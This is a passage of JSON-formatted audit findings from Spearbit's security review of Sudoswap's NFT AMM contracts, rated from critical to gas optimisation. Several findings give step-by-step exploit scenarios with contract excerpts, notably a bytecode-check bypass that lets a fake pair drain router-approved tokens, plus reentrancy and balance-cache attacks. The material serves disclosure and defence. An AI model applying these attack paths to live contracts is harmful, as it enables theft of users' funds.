        "body": "Spearbit discovered that the functions verifying if a contract is a pair do so by only checking the rst 54 bytes (i.e. the Proxy code). An attacker could deploy a contract that starts with the rst 54 bytes of proxy code but have a malicious payload, and these functions will still verify it as a legitimate clone. We have found this to be a critical issue based on the feasibility of a potential exploit. Consider the following scenario: 1. An attacker creates a malicious pair by making a copy of the source of cloneETHPair() supplying malicious values for factory, bondingCurve, nft and poolType using a valid template for the connected contract. 2. The attacker has a contract with valid proxy code, connected to a valid template, but the rest of the parameters are invalid. 3. The Pair is initialized via a copy of initialize() of LSSVMPair, which calls __Ownable_init() to set a malicious owner. 4 4. The malicious owner calls call(), with target equal to the router contract and the calldata for the function pairTransferERC20From(): // Owner is set by pair creator function call(address payable target, bytes calldata data) external onlyOwner { // Factory is malicious LSSVMPairFactoryLike _factory = factory(); // `callAllowed()` is malicious and returns true require(_factory.callAllowed(target), \"Target must be whitelisted\"); (bool result, ) = target.call{value: 0}(data); require(result, \"Call failed\"); ,! } 5. The check for onlyOwner and require pass, therefore pairTransferERC20From() is called with the malicious Pair as msg.sender. 6. The router checks if it is called from a valid pair via isPair(): function pairTransferERC20From(...) external { // Verify caller is a trusted pair contract // The malicious pair passed this test require(factory.isPair(msg.sender, variant), \"Not pair\"); ... token.safeTransferFrom(from, to, amount); } 7. Because the function isPair() only checks the rst 54 bytes (the runtime code including the implementation address), isPair() does not check for extra parameters factory, bondingCurve, nft or poolType: 5 function isPair(address potentialPair, PairVariant variant) ... { ... } else if (variant == PairVariant.ENUMERABLE_ETH) { return ,! LSSVMPairCloner.isETHPairClone(address(enumerableETHTemplate),potentialPair); } ... } function isETHPairClone(address implementation, address query) ... { ... // Compare expected bytecode with that of the queried contract let other := add(ptr, 0x40) extcodecopy(query, other, 0, 0x36) result := and( eq(mload(ptr), mload(other)), // Checks 32 + 22 = 54 bytes eq(mload(add(ptr, 0x16)), mload(add(other, 0x16))) ) } 8. Now the malicious pair is considered valid, the require statement in pair- TransferERC20From() has passed and tokens can be transferred to the attacker from anyone who has set an allowance for the router.",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Factory Owner can steal user funds approved to the Router",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "A pair owner can make arbitrary calls to any contract that has been approved by the factory owner. The code in the factory intends to prevent 6 router contracts from being approved for calls because router contracts can have access to user funds. An example includes the pairTransferERC20From() function, that can be used to steal funds from any account which has given it approval. The router contracts can nevertheless be whitelisted by rst being removed as a router and then being whitelisted. This way anyone can deploy a pair and use the call function to steal user funds.",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Missing check in the number of Received Tokens when tokens are transferred directly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "Within the function _validateTokenInput() of LSSVMPairERC20, two methods exist to transfer tokens. In the rst method via router.pairTrans ferERC20From() a check is performed on the number of received tokens. In the second method no checks are done. Recent hacks (e.g. Qubit nance) have successfully exploited safeTransfer- From() functions which did not revert nor transfer tokens. Additionally, with malicious or re-balancing tokens the number of transferred tokens might be dif- ferent from the amount requested to be transferred. 7 function _validateTokenInput(...) ... { ... if (isRouter) { ... // Call router to transfer tokens from user uint256 beforeBalance = _token.balanceOf(_assetRecipient); router.pairTransferERC20From(...) // Verify token transfer (protect pair against malicious router) require( _token.balanceOf(_assetRecipient) - beforeBalance == ,! inputAmount, \"ERC20 not transferred in\"); } else { // Transfer tokens directly _token.safeTransferFrom(msg.sender, _assetRecipient, inputAmount); } }",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Malicious assetRecipient could get an unfair amount of tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "The function _swapNFTsForToken() of LSSVMRouter calls safe- TransferFrom(), which then calls ERC721Received of assetRecipient. A ma- licious assetRecipient could manipulate its NFT balance by buying additional NFTs via the Pair and sending or selling them back to the Pair, enabling the malicious actor to obtain an unfair amount of tokens via routerSwapNFTsForTo- ken(). 8 function _swapNFTsForToken(...) ... { ... swapList[i].pair.cacheAssetRecipientNFTBalance(); ... for (uint256 j = 0; j < swapList[i].nftIds.length; j++) { ,! ,! nft.safeTransferFrom(msg.sender,assetRecipient,swapList[i].nftIds[j]); // call to onERC721Received of assetRecipient } ... outputAmount += swapList[i].pair.routerSwapNFTsForToken(tokenRecipient); // checks the token balance of assetRecipient } ,! ,! }",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Malicious Router can exploit cacheAssetRecipientNFTBalance to drain pair funds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "A malicious router could be whitelisted by an inattentive or a ma- licious factory owner and drain pair funds in the following exploit scenario: 1. Call the cache function. Suppose that the current balance is 10, so it gets cached. 2. Sell 5 NFTs to the pair and get paid using swapNFTsForToken. Total bal- ance is now 15 but the cached balance is still 10. 3. Call routerSwapNFTsForToken. This function will compute total_balance 9 - cached_balance, assume 5 NFTs have been sent to it and pay the user. However, no new NFTs have been sent and it already paid for them in Step 2.",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Malicious Router can steal NFTs via Re-Entrancy attack",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "If the factory owner approves a malicious _router, it is possible for the malicious router to call functions like swapTokenForAnyNFTs() and set is- Router to true. Once that function reaches router.pairTransferERC20From() in _validateTokenInput(), they can re-enter the pair from the router and call swapTokenForAnyNFTs() again. This second time the function reaches router.pairTransferERC20From(), al- lowing the malicious router to execute a token transfer so that the require of _validateTokenInput is satised when the context returns to the pair. When the context returns from the reentrant call back to the original call, the require of _validateTokenInput would still pass because the balance was cached be- fore the reentrant call. Therefore, an attacker will receive 2 NFTs by sending tokens only once.",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "getAllHeldIds() of LSSVMPairMissingEnumerable is vulnerable to a denial of service attack",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "The contract LSSVMPairMissingEnumerable tries to compensate for NFT contracts that do not have ERC721Enumerable implemented. However, this cannot be done for everything as it is possible to use transferFrom() to send an NFT from the same collection to the Pair. In that case the callback on- ERC721Received() will not be triggered and the idSet administration of LSSVM- PairMissingEnumerable will not be updated. This means that nft().balanceO f(address(this)); can be different from the elements in idSet. Assuming an actor accidentally, or on purpose, uses transferFrom() to send additional NFTs to the Pair, getAllHeldIds() will fail as idSet.at(i) for unregistered NFTs will fail. This can be used in a grieng attack. getAllHeldIds() in LSSVMPairMissingEnumerable: function getAllHeldIds() external view override returns (uint256[] memory) { uint256 numNFTs = nft().balanceOf(address(this)); // returns the registered + unregistered NFTs uint256[] memory ids = new uint256[](numNFTs); for (uint256 i; i < numNFTs; i++) { ids[i] = idSet.at(i); // will fail at the unregistered NFTs } return ids; ,! } The following checks performed with _nft.balanceOf() might not be accurate in combination with LSSVMPairMissingEnumerable. Risk is low because any additional NFTs making later calls to _sendAnyNFTsToRecipient() and _send- SpecificNFTsToRecipient() will fail. However, this might make it more difcult to troubleshoot issues. 11 function swapTokenForAnyNFTs(...) .. { ,! ... require((numNFTs > 0) && (numNFTs <= _nft.balanceOf(address(this))),\"Ask for > 0 and <= balanceOf NFTs\"); ... _sendAnyNFTsToRecipient(_nft, nftRecipient, numNFTs); // could fail ... } function swapTokenForSpecificNFTs(...) ... { ... require((nftIds.length > 0) && (nftIds.length <= _nft.balanceOf(address(this))),\"Must ask for > 0 and < balanceOf NFTs\"); // '<' should be '<=' ... _sendSpecificNFTsToRecipient(_nft, nftRecipient, nftIds); // could fail ... ,! ,! } Note: The error string < balanceOf NFTs is not accurate.",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "With NFT pools the protocol fees end up in assetRecipient instead of _factory",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "Assume a scenario where an NFT pool with assetRecipient set have the received funds sent directly to the assetRecipient. Now, suppose a user executes the swapTokenForSpecificNFTs(). The function _validateTokenInput() sends the required input funds, including fees to the assetRecipient. The function _payProtocolFee() tries to send the fees to the _factory. However, this function attempts to do so from the pair con- tract. The pair contract does not have any funds because they have been sent directly to the assetRecipient. So following this action the payProtocolFee() lowers the fees to 0 and sends this number to the _factory while fees end up at assetRecipient' instead of at the _factory. The fees then end up at assetRecipient instead of at the _factory. Note:  The same issue occurs in swapTokenForAnyNFTs().  This issue occurs with both ETH and ERC20 NFT Pools, although their logic is slightly different.  This issue occurs both when swapTokenForSpecificNFTs() is called di- rectly as well as indirectly via the LSSVMRouter.  Although the pool fees are 0 with NFT pools, the factory fee is still present.  Luckily, TRADE pools cannot have an assetRecipient as this would also create issues. 13 abstract contract LSSVMPair is Ownable, ReentrancyGuard { ... function swapTokenForSpecificNFTs(...) external payable virtual returns (uint256 inputAmount) { ,! ... _validateTokenInput(inputAmount, isRouter, routerCaller, _factory); // ,! sends inputAmount to assetRecipient _sendSpecificNFTsToRecipient(_nft, nftRecipient, nftIds); _refundTokenToSender(inputAmount); _payProtocolFee(_factory, protocolFee); ... } } abstract contract LSSVMPairERC20 is LSSVMPair { ... function _payProtocolFee(LSSVMPairFactoryLike _factory, uint256 protocolFee) internal override { ,! ... uint256 pairTokenBalance = _token.balanceOf(address(this)); if (protocolFee > pairTokenBalance) { protocolFee = pairTokenBalance; } _token.safeTransfer(address(_factory), protocolFee); // tries to send from the Pair contract } ,! } abstract contract LSSVMPairETH is LSSVMPair { function _payProtocolFee(LSSVMPairFactoryLike _factory, uint256 protocolFee) internal override { ,! ... uint256 pairETHBalance = address(this).balance; if (protocolFee > pairETHBalance) { protocolFee = pairETHBalance; } payable(address(_factory)).safeTransferETH(protocolFee); // tries to send from the Pair contract } ,! }",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Error codes of Quote functions are unchecked",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "The error return values from functions getBuyNFTQuote() and getSellNFTQuote() are not checked in contract LSSVMRouter.sol, whereas other functions in contract LSSVMPair.sol do check for error==CurveErrorCodes.Err or.OK. abstract contract LSSVMPair is Ownable, ReentrancyGuard { ,! ,! ,! ... function getBuyNFTQuote(uint256 numNFTs) external view returns (CurveErrorCodes.Error error, ...) { (error, ...) = bondingCurve().getBuyInfo(...); } function getSellNFTQuote(uint256 numNFTs) external view returns (CurveErrorCodes.Error error, ...) { (error, ...) = bondingCurve().getSellInfo(...); } function swapTokenForAnyNFTs(...) (uint256 inputAmount) { external payable virtual returns ... (error, ...) = _bondingCurve.getBuyInfo(...); require(error == CurveErrorCodes.Error.OK, \"Bonding curve error\"); ... } } LSSVMRouter.sol#L526 (, , pairOutput, ) = swapList[i].pair.getSellNFTQuote(...); The following contract lines contain the same code snippet below: LSSVMRoute r.sol#L360, LSSVMRouter.sol#L407, LSSVMRouter.sol#L450, LSSVMRouter.so l#L493, LSSVMRouter.sol#L627, LSSVMRouter.sol#L664 (, , pairCost, ) = swapList[i].pair.getBuyNFTQuote(...); Note: The current Curve contracts, which implement the getBuyNFTQuote() and getSellNFTQuote() functions, have a limited number of potential errors. However, future Curve contracts might add additional error codes.",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Swaps can be front run by Pair Owner to extract any prot from slippage allowance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "If the user adds a nonzero slippage allowance, the pair owner can front run the swap to increase the fee/spot price and steal all of the slippage allowance. This basically makes sandwich attacks much easier and cheaper to execute for the pair owner.",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Add check for numItems == 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "Functions getBuyInfo() and getSellInfo() in LinearCurve.sol check that numItems != 0. However, the same getBuyInfo() and getSellInfo() functions in ExponentialCurve.sol do not perform this check. 17 contract LinearCurve is ICurve, CurveErrorCodes { function getBuyInfo(...) ... { // We only calculate changes for buying 1 or more NFTs if (numItems == 0) { return (Error.INVALID_NUMITEMS, 0, 0, 0); } ... } function getSellInfo(...) ... { // We only calculate changes for selling 1 or more NFTs if (numItems == 0) { return (Error.INVALID_NUMITEMS, 0, 0, 0); } ... } } contract ExponentialCurve is ICurve, CurveErrorCodes { function getBuyInfo(...) ... { // No check on `numItems` uint256 deltaPowN = delta.fpow(numItems, FixedPointMathLib.WAD); ... } function getSellInfo(... ) ... { // No check on `numItems` uint256 invDelta = ,! FixedPointMathLib.WAD.fdiv(delta,FixedPointMathLib.WAD); ... } } If the code remains unchanged, an erroneous situation may not be caught and funds might be sent when selling 0 NFTs. Luckily, when numItems == 0 then result outputValue of the functions in Expo- nentialCurve is still 0, so there is no real issue. However, it is still important to x this because a derived version of these functions might be used by future developers.",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Disallow arbitrary function calls to LSSVMPairETH",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "The contract LSSVMPairETH contains an open fallback() func- tion. The fallback() is most likely necessary because the proxy adds calldata and the receive() function, therefore not receiving the ETH. However, without additional checks any function call to an ETH Pair will succeed. This could result in unforseen scenarios which hackers could potentially exploit. fallback() external payable { emit TokenDeposited(msg.value); }",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Only transfer relevant funds for PoolType",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "The functions _initializePairETH() and _initializePairERC20() allow for the transfer of ETH/ERC20 and NFTs even when this is not relevant for the PoolType. Although funds can be rescued from the Pair, it is perhaps better to prevent these types of mistakes. 19 function _initializePairETH(...) ... { ... // Transfer initial `ETH` to `pair` // Only relevant for `PoolType.TOKEN` or `PoolType.TRADE` payable(address(_pair)).safeTransferETH(msg.value); ... // Transfer initial `NFT`s from `sender` to `pair` for (uint256 i = 0; i < _initialNFTIDs.length; i++) { // Only relevant for PoolType.NFT or PoolType.TRADE _nft.safeTransferFrom(msg.sender,address(_pair),_initialNFTIDs[i]); } } function _initializePairERC20(...) ... { ... // Transfer initial tokens to pair // Only relevant for PoolType.TOKEN or PoolType.TRADE _token.safeTransferFrom(msg.sender,address(_pair),_initialTokenBalance); ... // Transfer initial NFTs from sender to pair for (uint256 i = 0; i < _initialNFTIDs.length; i++) { // Only relevant for PoolType.NFT or PoolType.TRADE _nft.safeTransferFrom(msg.sender,address(_pair),_initialNFTIDs[i]); } }",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Check for 0 parameters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "Functions setCallAllowed() and setBondingCurveAllowed() do not check that target != 0 while the comparable function setRouterAllowed() does check for _router != 0. 20 function setCallAllowed(address payable target, bool isAllowed) external ,! onlyOwner { ... // No check on target callAllowed[target] = isAllowed; } function setBondingCurveAllowed(ICurve bondingCurve, bool isAllowed) external ,! onlyOwner { ... // No check on bondingCurve bondingCurveAllowed[bondingCurve] = isAllowed; } function setRouterAllowed(LSSVMRouter _router, bool isAllowed) external onlyOwner { require(address(_router) != address(0), \"0 router address\"); ... routerAllowed[_router] = isAllowed; ,! }",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Potentially undetected underow In assembly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "Functions factory(), bondingCurve(), nft(), poolType(), and token() have an assembly based calculation where the paramsLength is sub- tracted from calldatasize(). Assembly underow checks are disregarded and if too few parameters are supplied in calls to the functions in the LSSVMPair contract, this calculation may underow, resulting in the values for factory(), bondingCurve(), nft(), poolType(), and token() to be read from unexpected pieces of memory. This will be usually zeroed therefore execution will stop at some point. However, it is safer to prevent this from ever happening. 21 function factory() public pure returns (LSSVMPairFactoryLike _factory) { ... assembly {_factory := shr(0x60,calldataload(sub(calldatasize(), paramsLength)))} ,! } function bondingCurve() public pure returns (ICurve _bondingCurve) { ... assembly {_bondingCurve := shr(0x60,calldataload(add(sub(calldatasize(), paramsLength), 20)))} ,! } function nft() public pure returns (IERC721 _nft) { ... assembly {_nft := shr(0x60,calldataload(add(sub(calldatasize(), paramsLength), 40)))} ,! } function poolType() public pure returns (PoolType _poolType) { ... assembly {_poolType := shr(0xf8,calldataload(add(sub(calldatasize(), paramsLength), 60)))} ,! } function token() public pure returns (ERC20 _token) { ... assembly {_token := shr(0x60,calldataload(add(sub(calldatasize(), paramsLength), 61)))} ,! }",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Check number of NFTs is not 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "Functions swapNFTsForToken(), routerSwapNFTsForToken(), and getSellNFTQuote() in LSSVMPair.sol do not perform input verication on the number of NFTs. If _bondingCurve.getSellInfo() accidentally happens to re- turn a non-zero value, then an unfair amount of tokens will be given back to the caller. The current two versions of bondingCurve do return 0, but a future version might accidentally return non-zero. Note: 1. getSellInfo() is supposed to return an error when numNFTs == 0, but this does not always happen. This error code is not always checked. function swapNFTsForToken(uint256[] calldata nftIds, ...) external virtual ,! ,! returns (uint256 outputAmount) { ... // No check on `nftIds.length` (error, newSpotPrice, outputAmount, protocolFee) = nftIds.length,..); _bondingCurve.getSellInfo(..., ... } function routerSwapNFTsForToken(address payable tokenRecipient) ... { ,! ... uint256 numNFTs = _nft.balanceOf(getAssetRecipient()) - _assetRecipientNFTBalanceAtTransferStart; ... // No check that `numNFTs > 0` (error, newSpotPrice, outputAmount, protocolFee) = _bondingCurve.getSellInfo(..., numNFTs, ...); ,! } function getSellNFTQuote(uint256 numNFTs) ... { ... // No check that `numNFTs > 0` (error, newSpotPrice, outputAmount, protocolFee) = bondingCurve().getSellInfo(..., numNFTs,...); ... ,! } 2. For comparison, the function swapTokenForSpecificNFTs() does perform an entry check on the number of requested NFTs. 23 function swapTokenForSpecificNFTs(uint256[] calldata nftIds,...) ... { ... //There is a check on the number of requested `NFT`s require( (nftIds.length > 0) && (nftIds.length <= _nft.balanceOf(address(this))), \"Must ask for > 0 and < balanceOf NFTs\"); // check is present ... ,! ,! }",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Low Risk 22"
        ]
    },
    {
        "title": "Avoid utilizing inside knowledge of functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "ETH based swap functions use isRouter==false and router- Caller==address(0) as parameters to swapTokenForAnyNFTs() and swapToken- ForSpecificNFTs(). These parameters end up in _validateTokenInput(). The LSSVMPairETH version of this function does not use those parameters, so it is not a problem at this point. However, the call actually originates from the Router so functionally isRouter should be true. Our concern is that using inside knowledge of the functions might potentially introduce subtle issues in the following scenarios: 24 function robustSwapETHForAnyNFTs(...) ... { ... remainingValue -= swapList[i].pair.swapTokenForAnyNFTs{value: pairCost}(swapList[i].numItems, nftRecipient, false, address(0)); ... ,! } function robustSwapETHForSpecificNFTs(...) ... { ... remainingValue -= swapList[i].pair.swapTokenForSpecificNFTs{value: pairCost}(swapList[i].nftIds, nftRecipient, false, address(0)); ... ,! } function _swapETHForAnyNFTs(...) ... { ... remainingValue -= swapList[i].pair.swapTokenForAnyNFTs{value: pairCost}(swapList[i].numItems, nftRecipient, false, address(0)); ... ,! } function _swapETHForSpecificNFTs(...) ... { ... remainingValue -= swapList[i].pair.swapTokenForSpecificNFTs{value: ,! pairCost}(swapList[i].nftIds, nftRecipient, false, address(0)); ... } function swapTokenForAnyNFTs(..., bool isRouter, address routerCaller) ... { ... _validateTokenInput(inputAmount, isRouter, routerCaller, _factory); ... } function swapTokenForSpecificNFTs(..., bool isRouter, address routerCaller) ... { ... _validateTokenInput(inputAmount, isRouter, routerCaller, _factory); ... ,! } abstract contract LSSVMPairETH is LSSVMPair { function _validateTokenInput(..., bool, /*isRouter*/ /*routerCaller*/ ... ) { address, // doesn't use isRouter and routerCaller } ,! }",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Add Reentrancy Guards",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "The abovementioned permalinks and corresponding functions are listed for Sudoswaps consideration to introduce reentrancy guard modiers. Currently, there is only one function that uses a reentrancy guard modier: withdrawAllETH() in LSSVMPairETH.sol#L94. Other functions in the codebase may also require reentrancy guard modiers. We have only seen reentrancy problems when malicious routers, assetRecip- ients, curves, factory owner or protocolFeeRecipient are involved. Despite normal prohibitions on this occurence, it is better to protect ones codebase than regret leaving open vulnerabilities available for potential attackers. There are three categories of functions that Sudoswap should consider applying reen- trancy guard modiers to: functions withdrawing ETH, functions sending ETH, and uses of safeTransferFrom() to external addresses (which will trigger an onERC1155Received() callback to receiving contracts). Examples of functions withdrawing ETH within LSSVM: LSSVMPairFactory.sol#L272 LSSVMPairETH.sol#L104 Instances of functions sending ETH within LSSVM: LSSVMPairETH.sol#L34 LSSVMPairETH.sol#L46 A couple of instances that use safeTransferFrom() to call external addresses, which will trigger an onERC1155Received() callback to receiving contracts: LSSVM- PairFactory.sol#L428 LSSVMRouter.sol#L544",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Saving 1 byte off the constructor() code",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "The dup2 before the return in the code below indicates a possible optimization by rearranging the stack. function cloneETHPair(...) ... { assembly { ... | RETURNDATASIZE // 3d | PUSH1 runtime // 60 runtime | DUP1 // 80 // 60 creation | PUSH1 creation (c) // 3d // 39 | RETURNDATASIZE | CODECOPY ,! ,! ,! [0-2d]: runtime code // 81 | DUP2 [0-2d]: runtime code // f3 | RETURN [0-2d]: runtime code ... } } | 0 (r) | r 0 | r r 0 | c r r 0 | 0 c r r 0 | r 0 | 0 c 0 | 0 |  |  |  |  |  | | |",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Decode extradata in calldata in one go",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "Spearbit discovered that the functions factory(), bondingCurve() and nft() are called independently but in most use cases all of the data is re- quired.",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Transfer last NFT instead of rst",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "When executing _sendAnyNFTsToRecipient() NFTs are retrieved by taking the rst available NFT and then sending it to nftRecipient. In (most) ERC721 implementations as well as in the EnumerableSet implementation, the array that stores the ownership is updated by swapping the last element with the selected element, to be able to shrink the array afterwards. When you always transfer the last NFT instead of the rst NFT, swapping isnt necessary so gas is saved. Code related to LSSVMPairEnumerable.sol: 29 abstract contract LSSVMPairEnumerable is LSSVMPair { function _sendAnyNFTsToRecipient(IERC721 _nft, address nftRecipient, uint256 numNFTs) internal override { ... for (uint256 i = 0; i < numNFTs; i++) { uint256 nftId = IERC721Enumerable(address(_nft)).tokenOfOwnerByIndex(address(this), 0); take the first NFT // _nft.safeTransferFrom(address(this), nftRecipient, nftId); // this calls _beforeTokenTransfer of ERC721Enumerable ,! ,! ,! ,! } } } abstract contract ERC721Enumerable is ERC721, IERC721Enumerable { function _beforeTokenTransfer(address from, address to, uint256 tokenId) internal virtual override { ,! ... _removeTokenFromOwnerEnumeration(from, tokenId); ... } function _removeTokenFromOwnerEnumeration(address from, uint256 tokenId) private { ... uint256 lastTokenIndex = ERC721.balanceOf(from) - 1; uint256 tokenIndex = _ownedTokensIndex[tokenId]; // When the token to delete is the last token, the swap operation is unnecessary ==> we can make use of this if (tokenIndex != lastTokenIndex) { uint256 lastTokenId = _ownedTokens[from][lastTokenIndex]; _ownedTokens[from][tokenIndex] = lastTokenId; // Move the last token to the slot of the to-delete token _ownedTokensIndex[lastTokenId] = tokenIndex; // Update the moved token's index } // This also deletes the contents at the last position of the array delete _ownedTokensIndex[tokenId]; delete _ownedTokens[from][lastTokenIndex]; ,! ,! ,! ,! } } Code related to LSSVMPairMissingEnumerable.sol: 30 abstract contract LSSVMPairMissingEnumerable is LSSVMPair { function _sendAnyNFTsToRecipient(IERC721 _nft, address nftRecipient, uint256 numNFTs) internal override { ,! ... for (uint256 i = 0; i < numNFTs; i++) { uint256 nftId = idSet.at(0); // take the first NFT _nft.safeTransferFrom(address(this), nftRecipient, nftId); idSet.remove(nftId); // finally calls _remove() } } } library EnumerableSet { function _remove(Set storage set, bytes32 value) private returns (bool) { ... uint256 toDeleteIndex = valueIndex - 1; uint256 lastIndex = set._values.length - 1; if (lastIndex != toDeleteIndex) { // ==> we can make use of this bytes32 lastvalue = set._values[lastIndex]; set._values[toDeleteIndex] = lastvalue; // Move the last value to the index where the value to delete is set._indexes[lastvalue] = valueIndex; // Replace lastvalue's index to valueIndex ,! ,! } set._values.pop(); delete set._indexes[value]; ... // Delete the slot where the moved value was stored // Delete the index for the deleted slot } }",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Simplify the connection between Pair and Router",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "There are two ways to interact between Pair and Router: 1. LSSVMPairERC20.sol calls router.pairTransferERC20From, where the goal is to transfer ERC20 2. _swapNFTsForToken calls pair.cacheAssetRecipientNFTBalance and pa ir.routerSwapNFTsForToken, where the goal is to transfer NFTs Using two different patterns to solve the same problem makes the code more com- plex and larger than necessary. Patterns with cacheAssetRecipientNFTBa lance() are also error prone. abstract contract LSSVMPairERC20 is LSSVMPair { function _validateTokenInput(..., bool isRouter, ...) ... { ... if (isRouter) { LSSVMRouter router = LSSVMRouter(payable(msg.sender)); // Verify ,! if router is allowed require(_factory.routerAllowed(router), \"Not router\"); ... router.pairTransferERC20From( _token, routerCaller, _assetRecipient, inputAmount, pairVariant() ); ... } ... } } contract LSSVMRouter { function pairTransferERC20From(...) ... { // verify caller is a trusted pair contract require(factory.isPair(msg.sender, variant), \"Not pair\"); ... // transfer tokens to pair token.safeTransferFrom(from, to, amount); // transfer ERC20 from the original caller } ,! } 33 contract LSSVMRouter { function _swapNFTsForToken(...) ... { ... // Cache current asset recipient balance swapList[i].pair.cacheAssetRecipientNFTBalance(); ... for (uint256 j = 0; j < swapList[i].nftIds.length; j++) { ,! ,! nft.safeTransferFrom(msg.sender,assetRecipient,swapList[i].nftIds[j]); // transfer NFTs from the original caller } ... outputAmount += ,! swapList[i].pair.routerSwapNFTsForToken(tokenRecipient); ... } } abstract contract LSSVMPair is Ownable, ReentrancyGuard { function cacheAssetRecipientNFTBalance() external { require(factory().routerAllowed(LSSVMRouter(payable(msg.sender))),\"Not router\"); // Verify if router is allowed assetRecipientNFTBalanceAtTransferStart = nft().balanceOf(getAssetRecipient()) + 2; } ,! ,! }",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Cache array length",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
        "body": "An array length is frequently used in for loops. This value is an evaluation for every iteration of the loop. Assuming the arrays are regularly larger than 1, it saves some gas to store the array length in a temporary variable. The following snippets are samples of the above context for lines of code where this is relevant: LSSVMPairEnumerable.sol#L51 LSSVMPairFactory.sol#L378 LSSVMPairMissingEnumerable.sol#L57 LSSVMRouter.sol#L358 For more examples, please see the context above for exact lines where this applies. The following contains examples of the overusage of nftIds.length: 35 function swapTokenForSpecificNFTs(...) ... { ... require((nftIds.length > 0) && (nftIds.length <= _nft.balanceOf(address(this))),\"Must ask for > 0 and < balanceOf NFTs\"); ... (error, newSpotPrice, inputAmount, protocolFee) = _bondingCurve ,! .getBuyInfo( spotPrice, delta, nftIds.length, fee, _factory.protocolFeeMultiplier() ); ... }",
        "labels": [
            "Spearbit",
            "Sudoswap",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use Custom Errors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
